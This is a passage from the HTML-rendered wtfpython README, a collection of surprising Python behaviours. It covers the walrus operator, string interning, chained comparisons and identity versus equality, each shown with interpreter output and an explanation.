href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-name-resolution-ignoring-class-scope&#34;&gt;▶ Name resolution ignoring class scope&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-rounding-like-a-banker-&#34;&gt;▶ Rounding like a banker *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-needles-in-a-haystack-&#34;&gt;▶ Needles in a Haystack *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-splitsies-&#34;&gt;▶ Splitsies *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-wild-imports-&#34;&gt;▶ Wild imports *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-all-sorted-&#34;&gt;▶ All sorted? *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-midnight-time-doesnt-exist&#34;&gt;▶ Midnight time doesn&#39;t exist?&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-the-hidden-treasures&#34;&gt;Section: The Hidden treasures!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-okay-python-can-you-make-me-fly&#34;&gt;▶ Okay Python, Can you make me fly?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-goto-but-why&#34;&gt;▶ &lt;code&gt;goto&lt;/code&gt;, but why?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-brace-yourself&#34;&gt;▶ Brace yourself!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-meet-friendly-language-uncle-for-life&#34;&gt;▶ Let&#39;s meet Friendly Language Uncle For Life&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-even-python-understands-that-love-is-complicated&#34;&gt;▶ Even Python understands that love is complicated&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yes-it-exists&#34;&gt;▶ Yes, it exists!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-ellipsis-&#34;&gt;▶ Ellipsis *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-inpinity&#34;&gt;▶ Inpinity&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-mangle&#34;&gt;▶ Let&#39;s mangle&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-appearances-are-deceptive&#34;&gt;Section: Appearances are deceptive!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-skipping-lines&#34;&gt;▶ Skipping lines?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-teleportation&#34;&gt;▶ Teleportation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-well-something-is-fishy&#34;&gt;▶ Well, something is fishy...&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-miscellaneous&#34;&gt;Section: Miscellaneous&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#--is-faster&#34;&gt;▶ &lt;code&gt;+=&lt;/code&gt; is faster&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-make-a-giant-string&#34;&gt;▶ Let&#39;s make a giant string!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-slowing-down-dict-lookups-&#34;&gt;▶ Slowing down &lt;code&gt;dict&lt;/code&gt; lookups *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-bloating-instance-dicts-&#34;&gt;▶ Bloating instance &lt;code&gt;dict&lt;/code&gt;s *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-minor-ones-&#34;&gt;▶ Minor Ones *&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#acknowledgements&#34;&gt;Acknowledgements&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-license&#34;&gt;🎓 License&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#surprise-your-friends-as-well&#34;&gt;Surprise your friends as well!&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#more-content-like-this&#34;&gt;More content like this?&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- tocstop --&gt; &#xA;&lt;h1&gt;Structure of the Examples&lt;/h1&gt; &#xA;&lt;p&gt;All the examples are structured like below:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;h3&gt;▶ Some fancy Title&lt;/h3&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Set up the code.&#xA;# Preparation for the magic...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;strong&gt;Output (Python version(s)):&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; triggering_statement&#xA;Some unexpected output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;(Optional): One line describing the unexpected output.&lt;/p&gt; &#xA; &lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Brief explanation of what&#39;s happening and why is it happening.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Set up code&#xA;# More examples for further clarification (if necessary)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;strong&gt;Output (Python version(s)):&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; trigger # some example that makes it easy to unveil the magic&#xA;# some justified output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; All the examples are tested on Python 3.5.2 interactive interpreter, and they should work for all the Python versions unless explicitly specified before the output.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;A nice way to get the most out of these examples, in my opinion, is to read them in sequential order, and for every example:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Carefully read the initial code for setting up the example. If you&#39;re an experienced Python programmer, you&#39;ll successfully anticipate what&#39;s going to happen next most of the time.&lt;/li&gt; &#xA; &lt;li&gt;Read the output snippets and, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Check if the outputs are the same as you&#39;d expect.&lt;/li&gt; &#xA;   &lt;li&gt;Make sure if you know the exact reason behind the output being the way it is. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;If the answer is no (which is perfectly okay), take a deep breath, and read the explanation (and if you still don&#39;t understand, shout out! and create an issue &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new&#34;&gt;here&lt;/a&gt;).&lt;/li&gt; &#xA;     &lt;li&gt;If yes, give a gentle pat on your back, and you may skip to the next example.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;PS: You can also read WTFPython at the command line using the &lt;a href=&#34;https://pypi.python.org/pypi/wtfpython&#34;&gt;pypi package&lt;/a&gt;,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pip install wtfpython -U&#xA;$ wtfpython&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;👀 Examples&lt;/h1&gt; &#xA;&lt;h2&gt;Section: Strain your brain!&lt;/h2&gt; &#xA;&lt;h3&gt;▶ First things first! *&lt;/h3&gt; &#xA;&lt;!-- Example ID: d3d73936-3cf1-4632-b5ab-817981338863 --&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;p&gt;For some reason, the Python 3.8&#39;s &#34;Walrus&#34; operator (&lt;code&gt;:=&lt;/code&gt;) has become quite popular. Let&#39;s check it out,&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Python version 3.8+&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf_walrus&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&#39;wtf_walrus&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a := &#34;wtf_walrus&#34;&#xA;File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    a := &#34;wtf_walrus&#34;&#xA;      ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a := &#34;wtf_walrus&#34;) # This works though&#xA;&#39;wtf_walrus&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&#39;wtf_walrus&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2 .&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Python version 3.8+&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = 6, 9&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;(6, 9)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a := 6, 9)&#xA;(6, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;6&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a, b = 6, 9 # Typical unpacking&#xA;&amp;gt;&amp;gt;&amp;gt; a, b&#xA;(6, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; (a, b = 16, 19) # Oops&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    (a, b = 16, 19)&#xA;          ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a, b := 16, 19) # This prints out a weird 3-tuple&#xA;(6, 16, 19)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a # a is still unchanged?&#xA;6&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;16&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;Quick walrus operator refresher&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The Walrus operator (&lt;code&gt;:=&lt;/code&gt;) was introduced in Python 3.8, it can be useful in situations where you&#39;d want to assign values to variables within an expression.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;        # Assume some expensive computation here&#xA;        # time.sleep(1000)&#xA;        return 5&#xA;&#xA;# So instead of,&#xA;if some_func():&#xA;        print(some_func()) # Which is bad practice since computation is happening twice&#xA;&#xA;# or&#xA;a = some_func()&#xA;if a:&#xA;    print(a)&#xA;&#xA;# Now you can concisely write&#xA;if a := some_func():&#xA;        print(a)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;gt; 3.8):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;5&#xA;5&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This saved one line of code, and implicitly prevented invoking &lt;code&gt;some_func&lt;/code&gt; twice.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Unparenthesized &#34;assignment expression&#34; (use of walrus operator), is restricted at the top level, hence the &lt;code&gt;SyntaxError&lt;/code&gt; in the &lt;code&gt;a := &#34;wtf_walrus&#34;&lt;/code&gt; statement of the first snippet. Parenthesizing it worked as expected and assigned &lt;code&gt;a&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;As usual, parenthesizing of an expression containing &lt;code&gt;=&lt;/code&gt; operator is not allowed. Hence the syntax error in &lt;code&gt;(a, b = 6, 9)&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The syntax of the Walrus operator is of the form &lt;code&gt;NAME:= expr&lt;/code&gt;, where &lt;code&gt;NAME&lt;/code&gt; is a valid identifier, and &lt;code&gt;expr&lt;/code&gt; is a valid expression. Hence, iterable packing and unpacking are not supported which means,&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;code&gt;(a := 6, 9)&lt;/code&gt; is equivalent to &lt;code&gt;((a := 6), 9)&lt;/code&gt; and ultimately &lt;code&gt;(a, 9) &lt;/code&gt; (where &lt;code&gt;a&lt;/code&gt;&#39;s value is 6&#39;)&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; (a := 6, 9) == ((a := 6), 9)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; x = (a := 696, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; x&#xA;(696, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; x[0] is a # Both reference same memory location&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;Similarly, &lt;code&gt;(a, b := 16, 19)&lt;/code&gt; is equivalent to &lt;code&gt;(a, (b := 16), 19)&lt;/code&gt; which is nothing but a 3-tuple.&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Strings can be tricky sometimes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 30f1d3fc-e267-4b30-84ef-4d9e7091ac1a ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;some_string&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140420665652016&#xA;&amp;gt;&amp;gt;&amp;gt; id(&#34;some&#34; + &#34;_&#34; + &#34;string&#34;) # Notice that both the ids are same.&#xA;140420665652016&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;wtf&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = &#34;wtf!&#34;, &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b # All versions except 3.7.x&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b # This will print True or False depending on where you&#39;re invoking it (python shell / ipython / as a script)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# This time in file some_file.py&#xA;a = &#34;wtf!&#34;&#xA;b = &#34;wtf!&#34;&#xA;print(a is b)&#xA;&#xA;# prints True when the module is invoked!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;4.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; Python3.7 )&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39; * 20 is &#39;aaaaaaaaaaaaaaaaaaaa&#39;&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39; * 21 is &#39;aaaaaaaaaaaaaaaaaaaaa&#39;&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Makes sense, right?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The behavior in first and second snippets is due to a CPython optimization (called string interning) that tries to use existing immutable objects in some cases rather than creating a new object every time.&lt;/li&gt; &#xA; &lt;li&gt;After being &#34;interned,&#34; many variables may reference the same string object in memory (saving memory thereby).&lt;/li&gt; &#xA; &lt;li&gt;In the snippets above, strings are implicitly interned. The decision of when to implicitly intern a string is implementation-dependent. There are some rules that can be used to guess if a string will be interned or not: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;All length 0 and length 1 strings are interned.&lt;/li&gt; &#xA;   &lt;li&gt;Strings are interned at compile time (&lt;code&gt;&#39;wtf&#39;&lt;/code&gt; will be interned but &lt;code&gt;&#39;&#39;.join([&#39;w&#39;, &#39;t&#39;, &#39;f&#39;])&lt;/code&gt; will not be interned)&lt;/li&gt; &#xA;   &lt;li&gt;Strings that are not composed of ASCII letters, digits or underscores, are not interned. This explains why &lt;code&gt;&#39;wtf!&#39;&lt;/code&gt; was not interned due to &lt;code&gt;!&lt;/code&gt;. CPython implementation of this rule can be found &lt;a href=&#34;https://github.com/python/cpython/raw/3.6/Objects/codeobject.c#L19&#34;&gt;here&lt;/a&gt; &lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/string-intern/string_intern.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are set to &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; in the same line, the Python interpreter creates a new object, then references the second variable at the same time. If you do it on separate lines, it doesn&#39;t &#34;know&#34; that there&#39;s already &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; as an object (because &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; is not implicitly interned as per the facts mentioned above). It&#39;s a compile-time optimization. This optimization doesn&#39;t apply to 3.7.x versions of CPython (check this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/100&#34;&gt;issue&lt;/a&gt; for more discussion).&lt;/li&gt; &#xA; &lt;li&gt;A compile unit in an interactive environment like IPython consists of a single statement, whereas it consists of the entire module in case of modules. &lt;code&gt;a, b = &#34;wtf!&#34;, &#34;wtf!&#34;&lt;/code&gt; is single statement, whereas &lt;code&gt;a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&lt;/code&gt; are two statements in a single line. This explains why the identities are different in &lt;code&gt;a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&lt;/code&gt;, and also explain why they are same when invoked in &lt;code&gt;some_file.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The abrupt change in the output of the fourth snippet is due to a &lt;a href=&#34;https://en.wikipedia.org/wiki/Peephole_optimization&#34;&gt;peephole optimization&lt;/a&gt; technique known as Constant folding. This means the expression &lt;code&gt;&#39;a&#39;*20&lt;/code&gt; is replaced by &lt;code&gt;&#39;aaaaaaaaaaaaaaaaaaaa&#39;&lt;/code&gt; during compilation to save a few clock cycles during runtime. Constant folding only occurs for strings having a length of less than 21. (Why? Imagine the size of &lt;code&gt;.pyc&lt;/code&gt; file generated as a result of the expression &lt;code&gt;&#39;a&#39;*10**10&lt;/code&gt;). &lt;a href=&#34;https://github.com/python/cpython/raw/3.6/Python/peephole.c#L288&#34;&gt;Here&#39;s&lt;/a&gt; the implementation source for the same.&lt;/li&gt; &#xA; &lt;li&gt;Note: In Python 3.7, Constant folding was moved out from peephole optimizer to the new AST optimizer with some change in logic as well, so the fourth snippet doesn&#39;t work for Python 3.7. You can read more about the change &lt;a href=&#34;https://bugs.python.org/issue11549&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Be careful with chained operations&lt;/h3&gt; &#xA;&lt;!-- Example ID: 07974979-9c86-4720-80bd-467aa19470d9 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; (False == False) in [False] # makes sense&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False == (False in [False]) # makes sense&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False == False in [False] # now what?&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; True is False == False&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False is False is False&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; 1 &amp;gt; 0 &amp;lt; 1&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; (1 &amp;gt; 0) &amp;lt; 1&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; 1 &amp;gt; (0 &amp;lt; 1)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;As per &lt;a href=&#34;https://docs.python.org/3/reference/expressions.html#membership-test-operations&#34;&gt;https://docs.python.org/3/reference/expressions.html#membership-test-operations&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Formally, if a, b, c, ..., y, z are expressions and op1, op2, ..., opN are comparison operators, then a op1 b op2 c ... y opN z is equivalent to a op1 b and b op2 c and ... y opN z, except that each expression is evaluated at most once.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;While such behavior might seem silly to you in the above examples, it&#39;s fantastic with stuff like &lt;code&gt;a == b == c&lt;/code&gt; and &lt;code&gt;0 &amp;lt;= x &amp;lt;= 100&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;False is False is False&lt;/code&gt; is equivalent to &lt;code&gt;(False is False) and (False is False)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;True is False == False&lt;/code&gt; is equivalent to &lt;code&gt;True is False and False == False&lt;/code&gt; and since the first part of the statement (&lt;code&gt;True is False&lt;/code&gt;) evaluates to &lt;code&gt;False&lt;/code&gt;, the overall expression evaluates to &lt;code&gt;False&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;1 &amp;gt; 0 &amp;lt; 1&lt;/code&gt; is equivalent to &lt;code&gt;1 &amp;gt; 0 and 0 &amp;lt; 1&lt;/code&gt; which evaluates to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The expression &lt;code&gt;(1 &amp;gt; 0) &amp;lt; 1&lt;/code&gt; is equivalent to &lt;code&gt;True &amp;lt; 1&lt;/code&gt; and &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; int(True)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; True + 1 #not relevant for this example, but just for fun&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; So, &lt;code&gt;1 &amp;lt; 1&lt;/code&gt; evaluates to &lt;code&gt;False&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ How not to use &lt;code&gt;is&lt;/code&gt; operator&lt;/h3&gt; &#xA;&lt;!-- Example ID: 230fa2ac-ab36-4ad1-b675-5f5a1c1a6217 ---&gt; &#xA;&lt;p&gt;The following is a very famous example present all over the internet.&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 256&#xA;&amp;gt;&amp;gt;&amp;gt; b = 256&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = 257&#xA;&amp;gt;&amp;gt;&amp;gt; b = 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = []&#xA;&amp;gt;&amp;gt;&amp;gt; b = []&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = tuple()&#xA;&amp;gt;&amp;gt;&amp;gt; b = tuple()&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3. &lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.7.x specifically)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;The difference between &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;==&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;is&lt;/code&gt; operator checks if both the operands refer to the same object (i.e., it checks if the identity of the operands matches or not).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;==&lt;/code&gt; operator compares the values of both the operands and checks if they are the same.&lt;/li&gt; &#xA; &lt;li&gt;So &lt;code&gt;is&lt;/code&gt; is for reference equality and &lt;code&gt;==&lt;/code&gt; is for value equality. An example to clear things up, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; class A: pass&#xA;&amp;gt;&amp;gt;&amp;gt; A() is A() # These are two empty objects at two different memory locations.&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; 